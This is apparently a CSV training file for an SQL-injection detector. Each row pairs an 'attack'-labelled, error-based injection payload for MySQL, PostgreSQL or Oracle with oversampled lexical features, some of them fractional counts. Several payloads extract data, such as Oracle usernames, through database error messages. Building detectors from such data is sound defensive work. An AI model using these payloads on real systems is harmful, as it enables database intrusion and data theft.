id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000410,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000057,0.23595248000391558,318.58882997051694,39.07360374631462,3.994858005584501,103.4416224778877,63.0,117.14720749262924,35.0,0.32466900548872407,0.19775537014177405,0.36771152984629407,0.1098640945232078,0.9263962536853818,0.0736037463146183,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.926396253685382,0.07360374631461816,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.08886684514402675,212.591956323253,40.204021838373514,4.196502444974877,116.59195632325299,2.0,71.0,23.0,0.5484158368046429,0.009408003399903275,0.3339841206965662,0.10819203909888765,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,3.897989080813244,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000088,0.03124309598748515,333.8023978846059,40.97529973557574,4.0248853134599845,109.91354907451509,63.0,124.90119894230295,35.987649867787866,0.32927410860902145,0.18873996284101446,0.37417335810599034,0.10781257044397372,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.98764986778787,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.9876498677878687,0.01235013221213127,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000413,attack,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000088,0.6572844281806532,333.729206967853,40.729206967852996,4.0089036417592805,109.729206967853,63.0,125.0,36.0,0.32879594289618125,0.18877614106044902,0.37455583543739884,0.10787208060597088,1.0,0.0,2.0,0.0,2.0,2.0,0.0,22.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.7292069678529964,0.2707930321470036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000414,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R000142,0.0700045813163056,225.3172513695065,31.0,3.4077460243692843,54.98049289627161,32.0,106.4538010956052,31.882957377629687,0.24413062524288853,0.1420990584296852,0.4722840464965385,0.14148626983088775,4.0,0.0,0.0,0.0,1.0,2.0,0.0,19.882957377629687,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.9804928962716144,0.0195071037283856,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000415,attack,error,-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000047,0.8587643395471937,339.5145593958705,31.77183909380573,3.270164650081691,75.02911879174098,48.0,158.4854406041295,58.0,0.22097763713445423,0.1413792606250765,0.46680982898516854,0.17083327325530073,0.0,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,32.742720302064754,2.7755575615628914e-17,-1.1102230246251565e-16,0.0,22.999999999999996,0.0,0.0,0.0,0.25727969793524413,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000416,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R000118,0.09282563673677276,348.94694353994186,35.02652823002907,3.597685748506382,92.1856976102035,48.97347176997093,147.78777415976742,60.0,0.2641857729394513,0.1403461633011792,0.4235220063734791,0.17194605738589042,0.0,4.0,0.026528230029071787,0.0,1.1102230246251565e-16,3.0,0.0,29.946943539941856,2.7755575615628914e-17,0.07958469008721525,0.9734717699709283,23.02652823002907,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.973471769970928,0.026528230029071787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000417,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R000118,1.4735819565441344,348.1577430010887,35.42112849945564,3.651527906417675,94.94789949618949,48.57887150054436,144.63097200435487,60.0,0.27274555186964794,0.1395283085194969,0.41538907595483776,0.17233706365601742,0.0,4.0,0.4211284994556425,0.0,1.1102230246251565e-16,3.0,0.0,29.157743001088715,2.7755575615628914e-17,1.2633854983669275,0.5788715005443574,23.42112849945564,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5788715005443574,0.4211284994556426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000418,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.23470943077703466,213.75343638842753,40.30137455537101,4.214963988972715,117.45206183305652,2.0,71.0,23.301374555371012,0.5494710150535173,0.009357219434533853,0.33218128992595175,0.10899047558599717,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.301374555371014,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000419,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.1597109942341434,281.8574987042247,36.0,3.982880113591973,108.0,35.0,103.28599896337978,35.57149974084495,0.3832552449360508,0.12420308863668314,0.3663537876742092,0.12618787875305687,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.571499740844946,2.7755575615628914e-17,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000420,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000151,0.9688657626767658,211.86512988512067,39.67314639496709,3.8314206583910204,63.0,37.0,87.4228453501097,24.44228453501097,0.29755566230637326,0.1747549127831081,0.412306058746791,0.11538336616372767,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.884569070021938,0.5577154649890311,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000421,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",nearest_attack_euclidean,R000096,0.5630563090944699,346.6660018335392,38.66600183353922,3.870635798202976,111.66400733415688,55.0,139.66799633292158,40.33399816646078,0.32210151703088824,0.15865444436337345,0.40289367553981964,0.11635036306591862,0.0,4.0,0.0,0.0,2.0,1.33399816646078,0.0,26.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.3339981664607805,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000422,attack,error,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000028,0.11797585322623148,324.07427597409514,35.0,3.631122770575112,88.0,48.0,132.07427597409512,56.0,0.27154305569074855,0.1481143940131356,0.4075424239474576,0.17280012634865818,0.9628620129524376,0.03713798704756255,1.0,0.0,1.1102230246251565e-16,2.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,22.999999999999996,0.9628620129524377,0.03713798704756252,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000423,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.5103868421347936,282.9256791856584,36.0,3.9716745748394,108.23873795874259,35.0,104.16441714440096,35.522524082514835,0.3826354446636593,0.12372088640847576,0.36812417611415804,0.12551949281370692,3.6418930618861247,0.0,0.0,0.0,2.0,1.8806310206287082,0.0,19.88063102062871,2.7755575615628914e-17,2.0,5.0,3.8806310206287082,1.0,0.0,0.0,0.11936897937129169,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.8806310206287087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.880631020628709
SMOTE_000424,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.2828360531635981,213.50278535745156,38.0,3.778176345030196,63.0,37.0,89.29641147084247,24.2063738866091,0.29545676485646427,0.17352222697919328,0.41772464882926336,0.11329635933507907,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.2063738866091,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000425,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,1.4554398787971794,346.9328051502382,33.35573161658726,3.622773482218915,96.26877939904719,45.0,144.44268383412734,61.22134191706367,0.27755886354361575,0.12971034289721206,0.41629184417825305,0.17643894938091914,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.6442683834127343,0.0,29.288536766825466,1.2885367668254686,3.0,0.0,22.644268383412733,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000426,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,0.38242404639397026,346.8433743531823,33.0,3.561044277445974,91.15180785900037,45.30843350581805,147.845783247091,62.53734974127293,0.2627389345762949,0.13068571169558763,0.42630141491247003,0.1802739388156475,3.768674870636463,0.0,0.0,0.0,1.1102230246251565e-16,2.9228916235454876,0.0,30.07710837645451,1.8457832470909752,2.7686748706364623,0.07710837645451285,22.922891623545485,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9228916235454876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.922891623545487
SMOTE_000427,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000127,1.5181231273124698,214.1501557910338,29.83751669189648,3.404120527238402,50.90004451172394,35.09995548827605,99.25011127930986,28.900044511723948,0.23748226965419203,0.16579097573714677,0.46240740819411397,0.13431934641454724,2.450022255861973,0.0,0.0,0.0,1.0,2.0,0.0,18.450022255861974,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,0.6125055639654933,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000428,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000021,0.789505588380143,203.15962550019097,33.684402833354554,3.6902865725874445,52.79081983348187,40.0,84.36880566670911,26.0,0.25962568338639697,0.19697439702312258,0.41536656152545076,0.1280333580650297,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.6844028333545533,0.31559716664544674,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000429,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.3033244290364189,192.97758066966023,28.227204295631058,3.5035359941096265,47.11360214781553,35.0,84.09118281747577,26.772795704368942,0.24422102327116696,0.18140943651607389,0.4356532490852376,0.13871629112752154,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,15.772795704368942,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.1136021478155291,0.8863978521844709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000430,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000033,0.3503601730968181,284.0,35.34739309856923,3.9597798248969913,108.34739309856923,35.0,104.76840460095384,35.88420230047692,0.3815049052766522,0.12323943661971831,0.36890283310195016,0.1263528250016793,0.0,4.0,0.0,0.0,2.0,1.8842023004769244,0.0,20.0,2.7755575615628914e-17,2.0,5.0,3.8842023004769244,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.8842023004769244,0.11579769952307567,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000431,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R000142,0.9066495156376183,225.62329036811067,31.0,3.390105692995988,54.62329036811068,32.0,107.0,32.0,0.24209602070692088,0.1418299844291142,0.4742440104348507,0.1418299844291142,4.0,0.0,0.0,0.0,1.0,2.0,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.6232903681106816,0.37670963188931844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000432,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000117,1.037094729394282,297.36161214207414,35.742311785670786,3.8145701000948784,102.06150571463371,35.0,119.84623571341574,40.45387071402472,0.34379271420124013,0.11778686194183616,0.40252030673085865,0.1359001171260651,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.969247142683148,1.4846235713415734,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000433,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,0.049726918563973425,194.02476005823323,27.04952011646647,3.5105409913550267,44.173320407632644,38.90095976706706,83.0,27.950479883533532,0.2276641479386326,0.20049750337139607,0.4277807273372096,0.14405762135276165,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.975239941766765,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.975239941766765,1.9752399417667652,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
